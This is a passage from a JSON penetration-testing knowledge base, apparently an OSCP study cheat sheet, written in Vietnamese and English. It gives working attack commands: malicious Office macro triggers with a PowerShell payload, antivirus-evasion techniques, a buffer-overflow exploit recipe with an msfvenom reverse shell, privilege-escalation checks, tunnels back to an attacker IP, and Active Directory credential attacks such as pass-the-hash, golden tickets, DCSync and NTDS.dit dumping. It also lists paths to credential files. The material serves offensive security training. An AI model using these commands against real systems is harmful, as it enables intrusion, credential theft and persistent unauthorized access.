    "content": "\n**1. Tạo Macro:**\n   * Sử dụng Visual Basic for Applications (VBA).\n   * Trigger tự động khi mở file: `Sub AutoOpen()` hoặc `Sub Document_Open()`.\n   * Payload cơ bản để chạy lệnh: `CreateObject(\"Wscript.Shell\").Run \"powershell.exe ...\"`\n\n**2. Lưu File:**\n   * Phải lưu dưới dạng hỗ trợ macro: `.doc` (Word 97-2003) hoặc `.docm` (Word Macro-Enabled).\n   * `.docx` không thể lưu macro trực tiếp.\n\n**3. Social Engineering:**\n   * Nạn nhân phải chủ động 'Enable Content' hoặc 'Enable Editing'.\n   * Cảnh báo về Mark-of-the-Web (MOTW) đối với các file tải từ internet.",
    "tags": ["macro", "office", "vba", "payloads", "phishing"],
    "code_snippets": [
      { "language": "bash", "command": "Sub AutoOpen()" },
      { "language": "bash", "command": "Sub Document_Open()" },
      { "language": "powershell", "command": "CreateObject(\"Wscript.Shell\").Run \"powershell.exe ...\"" },
      { "language": "bash", "command": ".doc" },
      { "language": "bash", "command": ".docm" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "av_evasion",
    "category": "Evasion",
    "title": "Checklist cho Antivirus (AV) Evasion",
    "content": "\n**1. On-Disk Evasion (Lẩn tránh khi file nằm trên đĩa):**\n   * **Packers/Crypters:** Sử dụng các công cụ như UPX để nén và mã hóa file thực thi.\n   * **Obfuscation:** Làm rối code, thay đổi tên biến, hàm để tránh signature-based detection.\n   * **Thay đổi signature:** Thay đổi vài byte trong file để làm hỏng signature đã biết.\n\n**2. In-Memory Evasion (Lẩn tránh khi chạy trong bộ nhớ):**\n   * **Process Injection:** Tiêm shellcode vào một process hợp lệ (ví dụ: explorer.exe).\n   * **Reflective DLL Injection:** Load một DLL trực tiếp từ bộ nhớ thay vì từ đĩa.\n   * **Process Hollowing:** Tạo một process hợp lệ ở trạng thái tạm dừng, ghi đè bộ nhớ của nó bằng mã độc, sau đó tiếp tục.\n\n**3. Kỹ thuật chung:**\n   * Sử dụng code/payload tự viết thay vì các payload mặc định (ví dụ: của Metasploit).",
    "tags": ["av evasion", "antivirus", "bypass", "process injection", "obfuscation"],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "buffer_overflow",
    "category": "Exploit Development",
    "title": "Quy trình Windows Buffer Overflow (32-bit)",
    "content": "\n**1. Spiking/Fuzzing:**\n   * Gửi một chuỗi ký tự 'A' dài để làm crash chương trình.\n   * Xác định lệnh (ví dụ: TRUN, USER) và số byte gây crash.\n\n**2. Tìm EIP Offset:**\n   * Sử dụng `msf-pattern_create -l <số_byte>` để tạo chuỗi duy nhất.\n   * Gửi chuỗi này, tìm giá trị EIP trong debugger (ví dụ: 0x41316241).\n   * Sử dụng `msf-pattern_offset -q <giá_trị_EIP>` để tìm offset chính xác.\n\n**3. Tìm Bad Characters:**\n   * Gửi tất cả các ký tự từ `\\x01` đến `\\xff`.\n   * Kiểm tra trong memory dump xem ký tự nào bị thay đổi hoặc làm đứt chuỗi.\n   * `\\x00` (null byte) luôn là bad character.\n\n**4. Tìm JMP ESP:**\n   * Tìm một địa chỉ memory chứa lệnh `JMP ESP` trong một DLL không có ASLR/DEP.\n   * Sử dụng `mona modules` trong Immunity Debugger.\n   * Sử dụng `!mona find -s \"\\xff\\xe4\" -m <dll_name>`\n\n**5. Tạo Shellcode:**\n   * Sử dụng `msfvenom` để tạo payload, loại bỏ bad chars.\n   * `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\\x00\\x...' -v shellcode`\n\n**6. Xây dựng Exploit cuối cùng:**\n   * Cấu trúc: `JUNK (offset) + EIP (JMP ESP address) + NOPs + SHELLCODE`",
    "tags": ["buffer overflow", "bof", "exploit dev", "eip", "jmp esp", "mona", "msfvenom"],
    "code_snippets": [
      { "language": "bash", "command": "msf-pattern_create -l <số_byte>" },
      { "language": "bash", "command": "msf-pattern_offset -q <giá_trị_EIP>" },
      { "language": "bash", "command": "mona modules" },
      { "language": "bash", "command": "!mona find -s \"\\xff\\xe4\" -m <dll_name>" },
      { "language": "bash", "command": "msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\\x00\\x...' -v shellcode" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "privesc_linux",
    "category": "Privilege Escalation",
    "title": "Checklist Leo thang đặc quyền trên Linux",
    "content": "\n**1. Enumeration tự động:**\n   * Chạy `linpeas.sh` hoặc `lse.sh`.\n\n**2. Enumeration thủ công:**\n   * **Kernel/OS version:** `uname -a`, `cat /etc/issue`. Tìm kernel exploit trên `searchsploit`.\n   * **Sudo rights:** `sudo -l`. Kiểm tra GTFOBins.\n   * **SUID binaries:** `find / -perm -u=s -type f 2>/dev/null`. Kiểm tra GTFOBins.\n   * **Capabilities:** `getcap -r / 2>/dev/null`\n   * **Cron jobs:** `cat /etc/crontab`, `ls -la /etc/cron.*`. Kiểm tra quyền ghi vào script.\n   * **File permissions:** Kiểm tra quyền ghi vào `/etc/passwd`, `/etc/shadow`.\n   * **NFS shares:** `cat /etc/exports`. Kiểm tra `no_root_squash`.",
    "tags": ["privesc", "linux", "leo thang đặc quyền", "linpeas", "sudo", "suid", "cron", "gtfobins"],
    "code_snippets": [
      { "language": "bash", "command": "linpeas.sh" },
      { "language": "bash", "command": "lse.sh" },
      { "language": "bash", "command": "uname -a" },
      { "language": "bash", "command": "cat /etc/issue" },
      { "language": "bash", "command": "searchsploit" },
      { "language": "bash", "command": "sudo -l" },
      { "language": "bash", "command": "find / -perm -u=s -type f 2>/dev/null" },
      { "language": "bash", "command": "getcap -r / 2>/dev/null" },
      { "language": "bash", "command": "cat /etc/crontab" },
      { "language": "bash", "command": "ls -la /etc/cron.*" },
      { "language": "bash", "command": "/etc/passwd" },
      { "language": "bash", "command": "/etc/shadow" },
      { "language": "bash", "command": "cat /etc/exports" },
      { "language": "bash", "command": "no_root_squash" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "privesc_windows",
    "category": "Privilege Escalation",
    "title": "Checklist Leo thang đặc quyền trên Windows",
    "content": "\n**1. Enumeration tự động:**\n   * Chạy `winPEAS.exe`, PowerUp.ps1, hoặc SharpUp.\n\n**2. Enumeration thủ công:**\n   * **System Info:** `systeminfo`. Tìm exploit cho HĐH/hotfix thiếu (Windows Exploit Suggester).\n   * **Unquoted Service Paths:** `wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v \"\"\"`.\n   * **Weak Service Permissions:** Sử dụng `accesschk.exe` hoặc `sc qc <service_name>`.\n   * **Scheduled Tasks:** `schtasks /query /fo LIST /v`. Kiểm tra quyền ghi trên 'Task To Run'.\n   * **Stored Credentials:** Kiểm tra SAM/SYSTEM backup, unattend.xml files, Putty sessions.\n   * **AlwaysInstallElevated:** Kiểm tra registry keys.\n   * `whoami /priv`: Kiểm tra các token đặc biệt như `SeImpersonatePrivilege` (Juicy/Rotten Potato).",
    "tags": ["privesc", "windows", "leo thang đặc quyền", "winpeas", "powerup", "unquoted service path", "seimpersonateprivilege", "potato"],
    "code_snippets": [
      { "language": "bash", "command": "winPEAS.exe" },
      { "language": "powershell", "command": "PowerUp.ps1" },
      { "language": "bash", "command": "systeminfo" },
      { "language": "bash", "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v \"\"\"" },
      { "language": "bash", "command": "accesschk.exe" },
      { "language": "bash", "command": "sc qc <service_name>" },
      { "language": "bash", "command": "schtasks /query /fo LIST /v" },
      { "language": "bash", "command": "whoami /priv" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "pivoting",
    "category": "Post-Exploitation",
    "title": "Kỹ thuật Pivoting & Port Forwarding",
    "content": "\n**1. SSH Local Port Forwarding (-L):** (Truy cập dịch vụ nội bộ từ máy attacker)\n   * `ssh -L <attacker_port>:<internal_service_ip>:<internal_service_port> user@<compromised_host>`\n   * Ví dụ: `ssh -L 8080:127.0.0.1:80 user@10.10.10.10`\n\n**2. SSH Remote Port Forwarding (-R):** (Triệu hồi một shell/dịch vụ từ một mạng bị chặn)\n   * Trên máy mục tiêu: `ssh -R <attacker_port>:<target_local_ip>:<target_local_port> user@<attacker_ip>`\n\n**3. SSH Dynamic Port Forwarding (-D):** (Tạo SOCKS proxy)\n   * `ssh -D <local_socks_port> user@<compromised_host>`\n\n**4. Chisel:** (Tunneling qua HTTP)\n   * **Server (Attacker):** `chisel server -p <listen_port> --reverse`\n   * **Client (Target):** `chisel client <attacker_ip>:<listen_port> R:socks`\n\n**5. Socat:** (Công cụ đa năng)\n   * Port forwarding cơ bản: `socat TCP-LISTEN:<local_port>,fork TCP:<remote_ip>:<remote_port>`\n\n**6. dnscat2:** (Tunneling qua DNS)\n   * **Server (Attacker):** `dnscat2-server <your_domain>`\n   * **Client (Target):** `dnscat --dns server=<attacker_ip> <your_domain>`",
    "tags": ["pivoting", "post-exploitation", "port forwarding", "ssh", "chisel", "socat", "dnscat2"],
    "code_snippets": [
      { "language": "bash", "command": "ssh -L <attacker_port>:<internal_service_ip>:<internal_service_port> user@<compromised_host>" },
      { "language": "bash", "command": "ssh -L 8080:127.0.0.1:80 user@10.10.10.10" },
      { "language": "bash", "command": "ssh -R <attacker_port>:<target_local_ip>:<target_local_port> user@<attacker_ip>" },
      { "language": "bash", "command": "ssh -D <local_socks_port> user@<compromised_host>" },
      { "language": "bash", "command": "chisel server -p <listen_port> --reverse" },
      { "language": "bash", "command": "chisel client <attacker_ip>:<listen_port> R:socks" },
      { "language": "bash", "command": "socat TCP-LISTEN:<local_port>,fork TCP:<remote_ip>:<remote_port>" },
      { "language": "bash", "command": "dnscat2-server <your_domain>" },
      { "language": "bash", "command": "dnscat --dns server=<attacker_ip> <your_domain>" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "active_directory",
    "category": "Active Directory",
    "title": "Checklist tấn công Active Directory cơ bản",
    "content": "\n**1. Enumeration:**\n   * `BloodHound`: Chạy SharpHound ingestor để map toàn bộ domain.\n   * `PowerView.ps1` hoặc `SharpView` để liệt kê users, groups, computers, GPOs.\n\n**2. Tấn công Kerberos:**\n   * **Kerberoasting:** Yêu cầu TGS cho các user có SPN. Crack hash offline.\n     * `impacket-GetUserSPNs` | `hashcat -m 13100`\n   * **AS-REP Roasting:** Tìm các user không yêu cầu pre-authentication. Crack hash offline.\n     * `impacket-GetNPUsers` | `hashcat -m 18200`",
    "tags": ["active directory", "ad", "bloodhound", "powerview", "kerberos", "kerberoasting", "as-rep roasting"],
    "code_snippets": [
      { "language": "bash", "command": "BloodHound" },
      { "language": "powershell", "command": "PowerView.ps1" },
      { "language": "bash", "command": "impacket-GetUserSPNs" },
      { "language": "bash", "command": "hashcat -m 13100" },
      { "language": "bash", "command": "impacket-GetNPUsers" },
      { "language": "bash", "command": "hashcat -m 18200" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "pass_the_hash",
    "category": "Active Directory",
    "title": "Checklist cho Pass the Hash (PtH)",
    "content": "\n**1. Khái niệm:**\n   * Sử dụng NTLM hash của một user thay cho mật khẩu để xác thực với các dịch vụ (chủ yếu là SMB).\n   * Không cần crack hash.\n\n**2. Yêu cầu:**\n   * Cần có NTLM hash (thường lấy từ LSASS dump).\n   * Cần có quyền Local Admin trên máy mục tiêu.\n\n**3. Công cụ:**\n   * **Impacket:** `impacket-psexec -hashes <lm_hash>:<ntlm_hash> <user>@<target_ip>`\n   * **Mimikatz:** `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe`",
    "tags": ["pass the hash", "pth", "ad", "impacket", "mimikatz", "ntlm"],
    "code_snippets": [
      { "language": "bash", "command": "impacket-psexec -hashes <lm_hash>:<ntlm_hash> <user>@<target_ip>" },
      { "language": "bash", "command": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "overpass_the_hash",
    "category": "Active Directory",
    "title": "Checklist cho Overpass the Hash",
    "content": "\n**1. Khái niệm:**\n   * Sử dụng NTLM hash của một user để yêu cầu một TGT Kerberos.\n   * Chuyển đổi từ NTLM hash sang một Kerberos ticket, cho phép tấn công các dịch vụ sử dụng Kerberos.\n\n**2. Yêu cầu:**\n   * NTLM hash của user.\n\n**3. Công cụ:**\n   * **Mimikatz:** `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell`\n   * Trong PowerShell mới, chạy `klist` để xem TGT.",
    "tags": ["overpass the hash", "pth", "ad", "kerberos", "mimikatz"],
    "code_snippets": [
      { "language": "powershell", "command": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell" },
      { "language": "powershell", "command": "klist" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "pass_the_ticket",
    "category": "Active Directory",
    "title": "Checklist cho Pass the Ticket (PtT)",
    "content": "\n**1. Khái niệm:**\n   * Sử dụng một Kerberos ticket (TGT hoặc TGS) hợp lệ đã bị đánh cắp từ một user/máy tính khác để xác thực.\n\n**2. Yêu cầu:**\n   * Một Kerberos ticket hợp lệ (file .kirbi).\n   * Thường được lấy từ LSASS dump.\n\n**3. Công cụ:**\n   * **Mimikatz:** `kerberos::ptt <path_to_ticket.kirbi>`\n   * **Rubeus:** `Rubeus.exe ptt /ticket:<base64_ticket>`",
    "tags": ["pass the ticket", "ptt", "ad", "kerberos", "mimikatz", "rubeus"],
    "code_snippets": [
      { "language": "bash", "command": "kerberos::ptt <path_to_ticket.kirbi>" },
      { "language": "bash", "command": "Rubeus.exe ptt /ticket:<base64_ticket>" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "golden_ticket",
    "category": "Active Directory",
    "title": "Checklist cho Golden Ticket",
    "content": "\n**1. Khái niệm:**\n   * Tạo một TGT Kerberos giả mạo (Golden Ticket) cho bất kỳ user nào, với bất kỳ quyền hạn nào.\n   * Cho phép duy trì truy cập (persistence) và leo thang đặc quyền lên Domain Admin.\n\n**2. Yêu cầu (RẤT QUAN TRỌNG):**\n   * **Domain Name:** Tên của domain.\n   * **Domain SID:** SID của domain.\n   * **krbtgt account NTLM hash:** Hash của tài khoản `krbtgt`.\n\n**3. Công cụ:**\n   * **Mimikatz:** `kerberos::golden /user:<user_giả_mạo> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt`",
    "tags": ["golden ticket", "ad", "kerberos", "persistence", "mimikatz", "krbtgt"],
    "code_snippets": [
      { "language": "bash", "command": "kerberos::golden /user:<user_giả_mạo> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "silver_ticket",
    "category": "Active Directory",
    "title": "Checklist cho Silver Ticket",
    "content": "\n**1. Khái niệm:**\n   * Tạo một TGS Kerberos giả mạo (Silver Ticket) cho một dịch vụ cụ thể (ví dụ: CIFS, HTTP).\n   * Cho phép truy cập vào một dịch vụ cụ thể mà không cần giao tiếp với Domain Controller.\n\n**2. Yêu cầu:**\n   * **Domain Name & SID.**\n   * **Service Account NTLM hash:** Hash của tài khoản chạy dịch vụ (ví dụ: tài khoản máy tính của file server).\n   * **Target SPN:** Tên SPN của dịch vụ (ví dụ: `cifs/fileserver.corp.com`).\n\n**3. Công cụ:**\n   * **Mimikatz:** `kerberos::golden /user:<user_giả_mạo> /domain:<domain> /sid:<domain_sid> /target:<target_server> /service:<service_name> /rc4:<service_account_hash> /ptt`",
    "tags": ["silver ticket", "ad", "kerberos", "mimikatz", "spn"],
    "code_snippets": [
      { "language": "bash", "command": "cifs/fileserver.corp.com" },
      { "language": "bash", "command": "kerberos::golden /user:<user_giả_mạo> /domain:<domain> /sid:<domain_sid> /target:<target_server> /service:<service_name> /rc4:<service_account_hash> /ptt" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "dcsync",
    "category": "Active Directory",
    "title": "Checklist cho DCSync",
    "content": "\n**1. Khái niệm:**\n   * Một user giả mạo làm Domain Controller và yêu cầu dữ liệu mật khẩu từ một DC thật thông qua giao thức Directory Replication Service (DRS).\n   * Có thể lấy NTLM hash của bất kỳ user nào, bao gồm cả `krbtgt`.\n\n**2. Yêu cầu (Quyền đặc biệt):**\n   * Cần có quyền 'Replicating Directory Changes' và 'Replicating Directory Changes All'.\n   * Mặc định các nhóm: Domain Admins, Enterprise Admins, Administrators có quyền này.\n\n**3. Công cụ:**\n   * **Mimikatz:** `lsadump::dcsync /domain:<domain> /user:<target_user>`\n   * **Impacket:** `impacket-secretsdump <domain>/<user_có_quyen>:<password>@<dc_ip> -just-dc-user <target_user>`",
    "tags": ["dcsync", "ad", "mimikatz", "impacket", "secretsdump", "krbtgt"],
    "code_snippets": [
      { "language": "bash", "command": "lsadump::dcsync /domain:<domain> /user:<target_user>" },
      { "language": "bash", "command": "impacket-secretsdump <domain>/<user_có_quyen>:<password>@<dc_ip> -just-dc-user <target_user>" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "shadow_copies",
    "category": "Active Directory",
    "title": "Checklist cho tấn công Volume Shadow Copies (VSS)",
    "content": "\n**1. Khái niệm:**\n   * Sử dụng Volume Shadow Copy Service để tạo bản sao (snapshot) của một volume, bao gồm cả các file đang bị khóa bởi hệ điều hành.\n   * Mục tiêu chính là sao chép file `NTDS.dit` (cơ sở dữ liệu AD) và registry hive `SYSTEM` từ một Domain Controller.\n\n**2. Quy trình:**\n   * Cần có quyền Local Admin trên DC.\n   * Tạo shadow copy: `vshadow.exe -p C:` hoặc `diskshadow`.\n   * Sao chép file từ shadow copy: `copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\NTDS\\ntds.dit C:\\temp\\`\n   * Sao chép SYSTEM hive: `reg.exe save hklm\\system C:\\temp\\system.hiv`\n   * Giải nén offline: `impacket-secretsdump -ntds ntds.dit -system system.hiv LOCAL`",
    "tags": ["shadow copies", "vss", "ad", "ntds.dit", "secretsdump"],
    "code_snippets": [
      { "language": "bash", "command": "vshadow.exe -p C:" },
      { "language": "bash", "command": "diskshadow" },
      { "language": "bash", "command": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\NTDS\\ntds.dit C:\\temp\\" },
      { "language": "bash", "command": "reg.exe save hklm\\system C:\\temp\\system.hiv" },
      { "language": "bash", "command": "impacket-secretsdump -ntds ntds.dit -system system.hiv LOCAL" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "psexec",
    "category": "Lateral Movement",
    "title": "Checklist cho PsExec Lateral Movement",
    "content": "\n**1. Khái niệm:**\n   * Công cụ của Sysinternals (cũng có trong Impacket) để thực thi lệnh từ xa.\n   * Hoạt động bằng cách tải lên một service binary (`PSEXESVC.exe`) vào share `ADMIN$`, sau đó tạo và chạy service đó từ xa.\n\n**2. Yêu cầu:**\n   * Port 445 (SMB) phải mở.\n   * Cần có quyền Local Admin trên máy mục tiêu.\n   * Cần có mật khẩu hoặc NTLM hash.\n\n**3. Công cụ:**\n   * **Sysinternals:** `PsExec64.exe \\\\<target_ip> -u <user> -p <password> cmd.exe`\n   * **Impacket:** `impacket-psexec <domain>/<user>:<password>@<target_ip>`",
    "tags": ["psexec", "lateral movement", "smb", "445", "impacket"],
    "code_snippets": [
      { "language": "bash", "command": "PsExec64.exe \\\\<target_ip> -u <user> -p <password> cmd.exe" },
      { "language": "bash", "command": "impacket-psexec <domain>/<user>:<password>@<target_ip>" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "wmi",
    "category": "Lateral Movement",
    "title": "Checklist cho WMI Lateral Movement",
    "content": "\n**1. Khái niệm:**\n   * Sử dụng Windows Management Instrumentation (WMI) để thực thi lệnh từ xa.\n   * Hoạt động qua DCOM (port 135 và các port động trong khoảng cao).\n\n**2. Yêu cầu:**\n   * Cần có quyền Local Admin trên máy mục tiêu.\n\n**3. Công cụ:**\n   * **wmic:** `wmic /node:<target_ip> /user:<user> /password:<password> process call create \"cmd.exe /c <command>\"`\n   * **Impacket:** `impacket-wmiexec <domain>/<user>:<password>@<target_ip>`\n   * **PowerShell:** `Invoke-CimMethod`",
    "tags": ["wmi", "lateral movement", "dcom", "135", "impacket", "wmiexec"],
    "code_snippets": [
      { "language": "bash", "command": "wmic /node:<target_ip> /user:<user> /password:<password> process call create \"cmd.exe /c <command>\"" },
      { "language": "bash", "command": "impacket-wmiexec <domain>/<user>:<password>@<target_ip>" },
      { "language": "powershell", "command": "Invoke-CimMethod" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "win_important_locations_users",
    "category": "Windows Enumeration",
    "title": "Windows: Important User File Locations",
    "content": "Key locations for user-specific data, including NTUser.dat.",
    "tags": ["windows", "enumeration", "files", "user data", "ntuser.dat"],
    "code_snippets": [
      {"language": "text", "command": "C:/Users/Administrator/NTUser.dat"},
      {"language": "text", "command": "C:/Documents and Settings/Administrator/NTUser.dat"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "win_important_locations_apache",
    "category": "Windows Enumeration",
    "title": "Windows: Important Apache Locations",
    "content": "Common locations for Apache configuration files (php.ini, httpd.conf) and log files (access.log, error.log) under various installation paths (C:/apache, Program Files, Program Files (x86), xampp).",
    "tags": ["windows", "enumeration", "files", "apache", "httpd", "php", "logs", "config", "xampp"],
    "code_snippets": [
      {"language": "text", "command": "C:/apache/logs/access.log"},
      {"language": "text", "command": "C:/apache/logs/error.log"},
      {"language": "text", "command": "C:/apache/php/php.ini"},
      {"language": "text", "command": "C:/Program Files/Apache Group/Apache/conf/httpd.conf"},
      {"language": "text", "command": "C:/Program Files/Apache Group/Apache/logs/access.log"},
      {"language": "text", "command": "C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf"},
      {"language": "text", "command": "C:/xampp/apache/logs/access.log"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "win_important_locations_mysql",
    "category": "Windows Enumeration",
    "title": "Windows: Important MySQL Locations",
    "content": "Common locations for MySQL configuration files (my.ini, my.cnf) and data/log files (hostname.err, mysql.err, mysql.log, mysql-bin.log) under various installation paths.",
    "tags": ["windows", "enumeration", "files", "mysql", "database", "config", "logs"],
    "code_snippets": [
      {"language": "text", "command": "C:/MySQL/data/hostname.err"},
      {"language": "text", "command": "C:/MySQL/my.ini"},
      {"language": "text", "command": "C:/Program Files/MySQL/my.ini"},
      {"language": "text", "command": "C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log"},
      {"language": "text", "command": "C:/Program Files/MySQL/MySQL Server 5.1/my.ini"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "win_important_locations_php",
    "category": "Windows Enumeration",
    "title": "Windows: Important PHP Locations",
    "content": "Common locations for the php.ini configuration file.",
    "tags": ["windows", "enumeration", "files", "php", "config"],
    "code_snippets": [
      {"language": "text", "command": "C:/php4/php.ini"},
      {"language": "text", "command": "C:/php5/php.ini"},
      {"language": "text", "command": "C:/php/php.ini"},
      {"language": "text", "command": "C:/WINDOWS/php.ini"},
      {"language": "text", "command": "C:/WINNT/php.ini"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "win_important_locations_system",
    "category": "Windows Enumeration",
    "title": "Windows: Important System File Locations",
    "content": "Key system configuration and log files including boot.ini, hosts file, SAM backups, registry hives backups, setup logs, and event logs.",
    "tags": ["windows", "enumeration", "files", "system config", "logs", "registry", "sam", "boot.ini", "hosts", "event logs"],
    "code_snippets": [
      {"language": "text", "command": "C:/boot.ini"},
      {"language": "text", "command": "C:/WINDOWS/System32/drivers/etc/hosts"},
      {"language": "text", "command": "C:/Windows/win.ini"},
      {"language": "text", "command": "C:/WINNT/win.ini"},
      {"language": "text", "command": "C:/WINDOWS/Repair/SAM"},
      {"language": "text", "command": "C:/Windows/repair/system"},
      {"language": "text", "command": "C:/Windows/Panther/Unattend/Unattended.xml"},
      {"language": "text", "command": "C:/Windows/debug/NetSetup.log"},
      {"language": "text", "command": "C:/Windows/system32/config/AppEvent.Evt"},
      {"language": "text", "command": "C:/Windows/system32/config/SecEvent.Evt"},
      {"language": "text", "command": "C:/Windows/system32/config/regback/sam"},
      {"language": "text", "command": "C:/Windows/system32/config/regback/system"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "win_important_locations_iis",
    "category": "Windows Enumeration",
    "title": "Windows: Important IIS Locations",
    "content": "Locations for IIS configuration files (applicationHost.config, ASPNET_schema.xml) and log files.",
    "tags": ["windows", "enumeration", "files", "iis", "web server", "config", "logs"],
    "code_snippets": [
      {"language": "text", "command": "C:/inetpub/wwwroot/global.asa"},
      {"language": "text", "command": "C:/Windows/System32/inetsrv/config/applicationHost.config"},
      {"language": "text", "command": "C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml"},
      {"language": "text", "command": "C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
   {
    "id": "win_important_locations_filezilla",
    "category": "Windows Enumeration",
    "title": "Windows: Important FileZilla Server Location",
    "content": "Location for the FileZilla Server configuration file which might contain sensitive settings.",
    "tags": ["windows", "enumeration", "files", "filezilla", "ftp", "config"],
    "code_snippets": [
      {"language": "text", "command": "C:/Program Files/FileZilla Server/FileZilla Server.xml"},
      {"language": "text", "command": "C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linux_important_locations_users_auth",
    "category": "Linux Enumeration",
    "title": "Linux: Important User & Auth Locations",
    "content": "Key files related to user accounts, password hashes, group memberships, and login history.",
    "tags": ["linux", "enumeration", "files", "users", "authentication", "passwords", "shadow", "sudoers", "history", "ssh keys"],
    "code_snippets": [
      {"language": "text", "command": "/etc/passwd"},
      {"language": "text", "command": "/etc/shadow"},
      {"language": "text", "command": "/etc/groups"},
      {"language": "text", "command": "/etc/sudoers"},
      {"language": "text", "command": "~/.bash_history"},
      {"language": "text", "command": "~/.ssh/authorized_keys"},
      {"language": "text", "command": "~/.ssh/id_rsa"},
      {"language": "text", "command": "/var/log/auth.log"},
      {"language": "text", "command": "/var/log/secure"},
      {"language": "text", "command": "/var/log/lastlog"},
      {"language": "text", "command": "/var/log/faillog"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linux_important_locations_cron_at",
    "category": "Linux Enumeration",
    "title": "Linux: Important Cron & At Locations",
    "content": "Locations related to scheduled tasks (cron and at).",
    "tags": ["linux", "enumeration", "files", "cron", "at", "scheduled tasks"],
    "code_snippets": [
      {"language": "text", "command": "/etc/crontab"},
      {"language": "text", "command": "/etc/cron.allow"},
      {"language": "text", "command": "/etc/cron.deny"},
      {"language": "text", "command": "/etc/anacrontab"},
      {"language": "text", "command": "/var/spool/cron/crontabs/root"},
      {"language": "text", "command": "/etc/at.allow"},
      {"language": "text", "command": "/etc/at.deny"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linux_important_locations_web_servers",
    "category": "Linux Enumeration",
    "title": "Linux: Important Web Server Locations (Apache, httpd, lighttpd)",
    "content": "Common configuration and log file locations for Apache, httpd, and lighttpd web servers.",
    "tags": ["linux", "enumeration", "files", "web server", "apache", "httpd", "lighttpd", "config", "logs"],
    "code_snippets": [
      {"language": "text", "command": "/etc/apache2/apache2.conf"},
      {"language": "text", "command": "/etc/apache2/sites-enabled/000-default.conf"},
      {"language": "text", "command": "/var/log/apache2/access.log"},
      {"language": "text", "command": "/var/log/apache2/error.log"},
      {"language": "text", "command": "/etc/httpd/conf/httpd.conf"},
      {"language": "text", "command": "/var/log/httpd/access_log"},
      {"language": "text", "command": "/var/log/httpd/error_log"},
      {"language": "text", "command": "/etc/lighttpd.conf"},
      {"language": "text", "command": "/var/log/lighttpd/access.log"},
      {"language": "text", "command": "/var/www/html/"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linux_important_locations_php",
    "category": "Linux Enumeration",
    "title": "Linux: Important PHP Locations",
    "content": "Common locations for php.ini configuration files across different PHP versions and setups.",
    "tags": ["linux", "enumeration", "files", "php", "config"],
    "code_snippets": [
      {"language": "text", "command": "/etc/php/7.4/apache2/php.ini"},
      {"language": "text", "command": "/etc/php/php.ini"},
      {"language": "text", "command": "/etc/php5/apache2/php.ini"},
      {"language": "text", "command": "/usr/local/lib/php.ini"}
    ],
    "related_cves": [],
    "source_file": "OSCP-Cheatsheet.pdf"
  },
  {
    "id": "linux_important_locations_mysql",
    "category": "Linux Enumeration",
    "title": "Linux: Important MySQL Locations",
    "content": "Common locations for MySQL configuration (my.cnf) and log files.",
    "tags": ["linux", "enumeration", "files", "mysql", "database", "config", "logs"],
    "code_snippets": [
      {"language": "text", "command": "/etc/my.cnf"},
      {"language": "text", "command": "/etc/mysql/my.cnf"},
      {"language": "text", "command": "/var/lib/mysql/my.cnf"},
      {"language": "text", "command": "/var/log/mysql.log"},
